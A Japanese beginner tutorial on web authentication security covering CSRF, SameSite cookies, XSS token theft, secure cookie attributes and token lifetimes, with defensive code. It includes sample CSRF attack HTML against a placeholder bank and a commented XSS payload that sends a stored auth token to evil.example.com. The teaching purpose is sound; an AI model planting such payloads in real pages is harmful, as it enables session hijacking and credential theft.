Auth3-A: CSRF 攻撃の仕組みを理解する

🔰 初心者向け解説
利用シーン: Webアプリに「ログイン状態のままで悪意あるリクエストを実行させる」攻撃を学びます。
なぜ重要？: セッション Cookie はブラウザが自動送信するため、ユーザーが気づかないまま意図しない操作（送金、パスワード変更など）を実行させることができます。
身近な例え: 銀行に行くとき財布を自動で持っていくクセがある人に、「この封筒を銀行に持っていって」と頼む詐欺。財布（Cookie）は自動的についてきます。

CSRF 攻撃の流れ

CSRF 攻撃シーケンス ユーザー 正規サービス 悪意あるサイト │ │ │ │─── ログイン ───▶│ │ │◀── Set-Cookie: session=abc123 ──────────────│ │ │ │ │ （ログイン状態で悪意あるサイトを閲覧） │ │─────────────────────────────────────────▶ │ │◀── 自動ロードされる偽フォームのHTMLを返す ─── │ │ │ │ │ （ブラウザが自動でフォームをサブミット） │ │─── POST /transfer?to=attacker&amount=10000 ──│ │ Cookie: session=abc123 ←自動付与！ │ │ │ │ │◀── 振込成功... ───│ │ ポイント: ユーザーは「悪意あるサイトを見ただけ」なのに セッションCookieが自動で正規サービスに送られる

CSRF 攻撃サンプルコード（教育目的）

悪意あるサイトに仕込まれた典型的な CSRF 攻撃コードです。実際には実行しません。 

// 悪意あるサイトのHTML（ページ読み込みと同時に実行）
// この1行が被害者のブラウザにロードされると...
<img src="https://bank.example.com/transfer?to=attacker&amount=10000">

// または自動サブミットするフォームとして:
<form action="https://bank.example.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

// ブラウザはbank.example.comへのCookieを自動送信するため
// セッションが有効なユーザーの認証が通ってしまう

CSRFトークンによる防御

// サーバー側: ログイン時にランダムなCSRFトークンを発行
const csrfToken = crypto.randomUUID(); // 推測不可能な値
// フォームに hidden field として埋め込む
// <input type="hidden" name="_csrf" value="a3f9b2...">

// サーバー受信時: トークンが一致するか検証
if (req.body._csrf !== session.csrfToken) {
  return res.status(403).json({ error: 'CSRF token mismatch' });
}

// 攻撃者はCSRFトークンをHTMLから読み取れない（同一オリジンポリシー）
// → 正しいトークンを持てず、リクエストは拒否される
実習: ブラウザでCSRFトークンを確認する

1. 任意のWebサービスにログインして DevTools（F12）を開く
2. Network タブ → フォーム送信時のリクエストを選択
3. Payload タブ（または Request Body）を確認
4. _csrf / csrf_token / authenticity_token などのフィールドを探す
5. リロードのたびに値が変わることを確認（1回限り有効）

Auth3-B: SameSite Cookie の防御効果を体験する

SameSite 属性の 3つの値の違い

値 クロスサイトリクエストでのCookie送信 CSRF 耐性 推奨度
SameSite=None 常に送信（Secure必須） なし 非推奨（CSRF脆弱）
SameSite=Lax トップレベルナビゲーション（GETリンクのみ）は送信 部分的 ブラウザのデフォルト値
SameSite=Strict 外部サイトからの遷移では一切送信しない 完全 推奨（セキュリティ優先）
Lax と Strict の違いを具体例で理解する
メールに貼られたリンク（https://bank.example.com/transfer）をクリックした場合:
• Lax: GETリクエストなのでCookieが送信される（ログイン状態が維持される）
• Strict: 外部からの遷移なのでCookieは送信されない（ログイン画面にリダイレクト）

Strict のデメリット: SNSシェアリンクや外部サービスからの遷移で毎回ログインが必要になる。 決済・管理画面は Strict、一般コンテンツは Lax というハイブリッド設計が現実的。

SameSite をコンソールでシミュレーション

// ブラウザコンソールで確認（DevTools → Application → Cookies）
// このページに新しいCookieを設定してSameSite動作を確認する

// ❌ 危険: SameSite未指定（古いブラウザではNone相当）
document.cookie = "session_bad=abc123; Path=/; Secure";

// ⚠️  標準: Lax（ブラウザのデフォルト、Chromeは未指定でLax扱い）
document.cookie = "session_lax=abc123; Path=/; Secure; SameSite=Lax";

// ✅ 推奨: Strict（クロスサイトリクエストで一切送信しない）
document.cookie = "session_strict=abc123; Path=/; Secure; SameSite=Strict";

// 設定後: DevTools → Application → Cookies で SameSite列を確認
console.log("DevTools → Application → Cookies タブで設定を確認してください");
▶ ボタンをクリックして Cookie を設定してください
HttpOnly Cookie は JavaScript から設定できません。 上のデモは document.cookie で設定できる通常の Cookie です。 実際の認証セッションは、サーバーが Set-Cookie: session=xxx; HttpOnly; SameSite=Strict; Secure を返すことで設定します。

Auth3-C: XSS とトークン窃取の仕組み

🔰 初心者向け解説
利用シーン: 認証トークンをどこに保存するかによって、XSS攻撃による被害範囲が大きく変わります。
なぜ重要？: localStorage にトークンを保存すると、XSSで簡単に盗まれます。HttpOnly Cookie に保存すると JavaScript からアクセスできないため、XSS への耐性が格段に上がります。
身近な例え: 財布を外のポケット（localStorage）と内ポケット（HttpOnly Cookie）に入れる違い。スリ（XSS）は外のポケットには届くが、内ポケットには手が届かない。

XSS によるトークン窃取シナリオ

// ===== 脆弱なコード例 =====
// ログイン成功時にlocalStorageに保存（危険！）
localStorage.setItem('auth_token', jwtToken);

// 攻撃者が注入したXSSスクリプト（例: コメント欄からの注入）
// <script>fetch('https://evil.example.com/steal?t='+localStorage.getItem('auth_token'))</script>

// 上記コードが実行されると、トークンが攻撃者サーバーに送信される

// ===== 安全な実装 =====
// サーバーが HttpOnly Cookie でトークンを管理
// Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/api

// JavaScriptからはアクセス不可能（document.cookieに表示されない）
document.cookie; // → HttpOnlyのCookieは含まれない

// リクエスト時は自動的にブラウザが付与（コードは不要）
fetch('/api/user').then(r => r.json()); // Cookieは自動送信

トークン保存場所の XSS 耐性比較

保存場所 XSS耐性 CSRF耐性 有効期限 推奨度
localStorage なし（JS から読み取り可） 高（自動送信なし） 永続 非推奨
sessionStorage なし（JS から読み取り可） 高 タブ閉鎖で消える 低リスクのみ許容
Cookie（通常） 低（JS読み取り可） 低（自動送信） Max-Age で設定 非推奨
Cookie（HttpOnly） 高（JS読み取り不可） 高（SameSite=Strict） Max-Age で設定 推奨
メモリ（変数） 高（ページ遷移で消える） 高 ページ離脱で消える アクセストークン向き

XSS 保護チェック — 実習

localStorage への保存 vs HttpOnly Cookie の読み取り確認

以下のコードをブラウザコンソールに貼り付けて実行し、違いを確認します: 

// ブラウザコンソール（F12）で実行してください
// Step 1: localStorageにトークンを保存
localStorage.setItem('test_token', 'eyJhbGciOiJIUzI1NiJ9.PAYLOAD.SIGNATURE');
console.log('localStorage から読み取り:', localStorage.getItem('test_token'));
// → 読み取れてしまう（XSSで盗まれる）

// Step 2: HttpOnly Cookie がJSで読み取れないことを確認
console.log('document.cookie:', document.cookie);
// → HttpOnly属性の付いたCookieはここに表示されない
// → DevTools(F12) → Application → Cookies でのみ確認可能

// Step 3: 後始末
localStorage.removeItem('test_token');

Auth3-D: セキュアな Cookie 設定を理解する

Cookie セキュリティ属性一覧

属性 役割 設定例 推奨
HttpOnly JavaScriptからの読み取りを禁止（XSS対策） HttpOnly 必須
Secure HTTPS接続時のみ送信（盗聴対策） Secure 必須
SameSite=Strict クロスサイトリクエストで送信しない（CSRF対策） SameSite=Strict 推奨
Max-Age 有効期限（秒数）。Session Cookieを避ける Max-Age=3600 推奨
Path=/api 送信先パスを制限（最小権限） Path=/api 推奨
__Host- プレフィックス Domain 指定を禁止・Path=/ 必須・Secure 必須を強制 __Host-session=... 最高レベル

__Host- プレフィックスとは

Cookie プレフィックスによるセキュリティ強化
__Host- プレフィックスを付けた Cookie は、ブラウザが以下を強制します:
• Secure 属性が必須（HTTP では設定も送信もできない）
• Domain 属性が禁止（特定ドメインへの限定が不可能 = より安全）
• Path=/ が必須（パスによる絞り込みを無効化）

サブドメインテイクオーバー攻撃などへの耐性が向上します。

セキュアCookie 設定例（推奨と非推奨の比較）

❌ 非推奨（脆弱な設定）

Set-Cookie: session=abc123

問題点:
• XSSで読み取り可能（HttpOnly なし）
• HTTP経由で送信される（Secure なし）
• CSRF攻撃に脆弱（SameSite なし）
• 有効期限なし（セッション依存）

✅ 推奨（セキュアな設定）

Set-Cookie: __Host-session=abc123;
  HttpOnly;
  Secure;
  SameSite=Strict;
  Max-Age=3600;
  Path=/

改善点:
• HttpOnly → XSS耐性
• Secure → HTTPS必須
• SameSite=Strict → CSRF対策
• Max-Age → 1時間で自動失効
• __Host- → サブドメイン保護

Auth3-E: トークン管理ベストプラクティス

アクセストークンとリフレッシュトークンの安全な管理

トークン管理アーキテクチャ（推奨パターン） ┌──────────────────────────────────────────────────────────────┐ │ ブラウザ側 │ │ │ │ ┌─────────────────────┐ ┌─────────────────────────────┐ │ │ │ メモリ（変数） │ │ HttpOnly Cookie │ │ │ │ アクセストークン │ │ リフレッシュトークン │ │ │ │ 有効期限: 15分 │ │ SameSite=Strict │ │ │ │ XSS: 安全 │ │ Secure; Max-Age=604800 │ │ │ │ ページ離脱で消える │ │ XSS: 安全（JS読み取り不可）│ │ │ └──────────┬──────────┘ └──────────────┬──────────────┘ │ │ │ │ │ └─────────────┼──────────────────────────────┼───────────────┘ │ Authorization: Bearer ... │ Cookie: refresh=... ▼ ▼ API サーバー /auth/refresh エンドポイント （リソース取得） （新しいアクセストークン発行）

トークンローテーションとログアウト実装

// ===== 推奨パターン: トークンのメモリ管理 =====
let accessToken = null; // メモリのみ（ページ離脱で消える）

// ログイン: アクセストークンはメモリ、リフレッシュはサーバーがCookieに設定
async function login(email, password) {
  const res = await fetch('/auth/login', {
    method: 'POST',
    credentials: 'include', // HttpOnly CookieをAPIへ送信
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });
  const data = await res.json();
  accessToken = data.access_token; // メモリに保存（lsには入れない）
  // refresh_token は Set-Cookie で HttpOnly Cookie に自動保存済み
}

// APIリクエスト: Authorizationヘッダーでアクセストークンを送信
async function apiFetch(path) {
  const res = await fetch(path, {
    credentials: 'include',
    headers: { 'Authorization': 'Bearer ' + accessToken }
  });
  if (res.status === 401) {
    await refreshTokens(); // 401 なら自動リフレッシュ
    return apiFetch(path);  // リトライ
  }
  return res.json();
}

// ログアウト: アクセストークンをクリア + サーバーにリフレッシュトークン失効を依頼
async function logout() {
  await fetch('/auth/logout', { method: 'POST', credentials: 'include' });
  accessToken = null; // メモリのアクセストークンをクリア
  // サーバー側: リフレッシュトークンをDB等から削除 + Cookie Max-Age=0 で即時失効
}

トークン有効期限の設計指針

トークン種別 推奨有効期限 保存場所 理由
アクセストークン 5〜15 分 メモリ（変数） 短い有効期限で盗まれても被害を最小化
リフレッシュトークン 7〜30 日 HttpOnly Cookie 長期セッション維持。ローテーションで使い捨て
ID トークン（OIDC） 1 時間 メモリ 表示用途のみ。署名検証後に使用
API キー 無期限（ローテーション運用） 環境変数（サーバー） クライアントには渡さない。定期的に再発行

Auth3-F: OutSystems でのセキュリティ確認

OutSystems Traditional Web — セッション Cookie の確認

OutSystems の Traditional Web アプリは、ログイン後に nr1.session Cookie を発行します。 この Cookie には HttpOnly / SameSite=Lax / Secure（HTTPS環境）が 設定されており、XSS・CSRF への標準的な対策が施されています。
確認手順: nr1.session Cookie の属性を DevTools で見る

1. OutSystems アプリにログインした状態で F12 → Application タブを開く
2. 左ペインの Storage → Cookies → アプリのURL をクリック
3. nr1.session を探して各属性を確認:
   • HttpOnly: ✓（チェックが入っていること）
   • SameSite: Lax
   • Secure: HTTPS環境では ✓
   • Path: /

確認手順: REST API リクエストの認証ヘッダーを確認する

⚠️ よくある間違い — セキュリティ実践編

❌ 間違い1: 「HttpOnly Cookie にすれば XSS は完全に防げる」

HttpOnly Cookie は「Cookie の中身を JavaScript で読めなくする」だけです。XSS 自体は依然として発生します。 攻撃者は Cookie を読めなくても、XSS を使って:
• 偽のログインフォームを表示してパスワードを盗む
• CSRF リクエストをユーザーのブラウザから送信させる
• DOM を操作して被害者を操作する
などを行えます。
正しい理解: HttpOnly Cookie は Cookie 窃取への対策。XSS そのものの対策は 出力エスケープ・CSP・DOMPurify 等の XSS 防止策が必要です。

❌ 間違い2: 「HTTPS を使っているから盗聴されない = CSRF も防げる」

HTTPS は通信の暗号化（盗聴対策）です。CSRF は被害者のブラウザが自発的に送るリクエストなので、 HTTPS でも発生します。CSRF 対策（CSRF トークン / SameSite Cookie）は別途必要です。

❌ 間違い3: 「JWTはPayloadが暗号化されているから安全」

JWT の Payload は Base64URL エンコードであり、暗号化ではありません。 誰でもデコードして中身を読めます（atob(payload) で確認可能）。 JWTの署名（Signature）は「改ざんされていないことの証明」であり、「秘密にする」仕組みではありません。 個人情報・権限情報を Payload に入れる場合は JWE（JSON Web Encryption）で別途暗号化が必要です。

📋 まとめ — セキュリティ実践 チェックポイント

対策 対象攻撃 実装方法 優先度
HttpOnly Cookie XSS による Cookie 窃取 Set-Cookie: ...; HttpOnly 必須
SameSite=Strict CSRF Set-Cookie: ...; SameSite=Strict 必須
CSRF トークン CSRF（SameSite=Laxの補完） hidden field / カスタムヘッダー 推奨
出力エスケープ / DOMPurify XSS そのもの HTMLエスケープ / ライブラリ 必須
CSP（Content-Security-Policy） XSS の実行制限 HTTPレスポンスヘッダー 推奨
Secure Cookie + HTTPS 通信盗聴 Set-Cookie: ...; Secure 必須
アクセストークンの短期化 トークン窃取後の長期悪用 有効期限 5〜15分 + リフレッシュ 推奨
